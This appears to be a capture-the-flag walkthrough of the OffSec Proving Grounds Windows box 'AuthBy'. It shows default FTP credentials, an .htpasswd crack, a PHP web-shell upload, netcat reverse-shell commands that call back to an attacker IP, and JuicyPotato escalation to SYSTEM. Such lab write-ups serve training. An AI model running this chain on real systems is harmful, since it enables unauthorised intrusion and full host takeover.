---
title: "PG: AuthBy"
date: 2023-03-07
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/authby/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - ftp-anonymous
  - htpasswd-crack
  - php-webshell
  - juicy-potato
  - seimpersonate
categories:
  - walkthrough
---

{{< box-info name="AuthBy" os="Windows" difficulty="Medium" ip="192.168.100.46" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
```
{{< /collapse >}}

Windows Server 2008 box. An ancient `zFTPServer` on 21, an HTTP app on the non-standard port 242 sitting behind HTTP Basic auth, the zFTPServer admin interface on 3145, and RDP on 3389. The name of the box is the hint: authentication is the whole game here.

### Port 21 - FTP

Anonymous login is allowed, but the real find is that `admin:admin` also works. That admin account is scoped straight to the web server's document root. The three existing files list as read-only, but the account can still drop **new** files into the directory — which is exactly what matters later:

```
ftp> dir
-r--r--r--   1 root  root   76 Nov 08  2011 index.php
-r--r--r--   1 root  root   45 Nov 08  2011 .htpasswd
-r--r--r--   1 root  root  161 Nov 08  2011 .htaccess
```

Pull `.htpasswd` (save it locally as `htpasswd.hash`) — it holds the hashed credential that gates port 242. Crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.hash
```

That recovers `offsec:elite`, the HTTP Basic creds for the web app.

### Port 242 - Web App

Apache 2.2.21 / PHP 5.3.8, with the entire site locked behind HTTP Basic auth (realm: `Qui e nuce nuculeum esse volt, frangit nucem!`). The cracked `offsec:elite` gets you past the login prompt.

---

## Foothold

### FTP-writable webroot → PHP web shell

Two facts combine into RCE: the admin FTP account can **write** into the webroot, and `offsec:elite` lets you **reach** whatever you drop there over HTTP. So upload a PHP web shell straight into the document root. PHP 5.3 is old enough that an old-school shell like [IndoXploit](https://github.com/indoxploit-coders/indoxploit-shell) is the right tool:

```bash
ftp 192.168.100.46      # admin:admin
ftp> put idx.php
```

Browse to the shell on port 242 (authenticating as `offsec:elite`), then use it to stage `nc.exe` into the webroot and fire a reverse shell:

```
C:\wamp\www\nc.exe -nv 192.168.49.101 1234 -e cmd.exe
```

Shell lands as `livda\apache`.

![whoami /all showing the apache service account holds SeImpersonatePrivilege](/images/authby/whoami.png)

---

## Privilege Escalation

### SeImpersonatePrivilege → JuicyPotato

`whoami /all` shows the service account carries **`SeImpersonatePrivilege`** (enabled). `systeminfo` confirms Windows Server 2008 SP1 on an **x86** platform — the textbook conditions for a Potato attack.

![systeminfo confirming Windows Server 2008 Standard, x86-based PC](/images/authby/systeminfo.png)

Because the host is 32-bit, grab the [x86 build of JuicyPotato](https://github.com/ivanitlearning/Juicy-Potato-x86) — the x64 binary silently fails here. Upload `jp32.exe` and a batch payload that calls back:

```bat
:: jp_pwn.bat
C:\wamp\www\nc.exe -nv 192.168.49.101 1234 -e cmd.exe
```

Start a listener, then abuse the privilege:

```
jp32.exe -p "C:\wamp\www\jp_pwn.bat" -l 9003 -t * -c "{752073A1-23F2-4396-85F0-8FDB879ED0ED}"
```

Catch a SYSTEM shell.

---

## Proof

![Directory of Administrator's Desktop, type proof.txt, and whoami returning nt authority\system](/images/authby/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- FTP write access to a webroot is game over — drop a web shell and you have RCE. `admin:admin` should never guard anything, let alone the document root.
- Always pull and crack `.htpasswd`. It frequently hands you the exact HTTP Basic creds gating the rest of the app.
- `SeImpersonatePrivilege` on older Windows (Server 2008/2012) is a free ride to SYSTEM via JuicyPotato — but match the binary architecture. This box is x86, so the x86 Potato is mandatory.
- Fit the tool to the target: PHP 5.3 wants a legacy shell (IndoXploit), and a 32-bit host needs the 32-bit exploit binary.
{{< /callout >}}
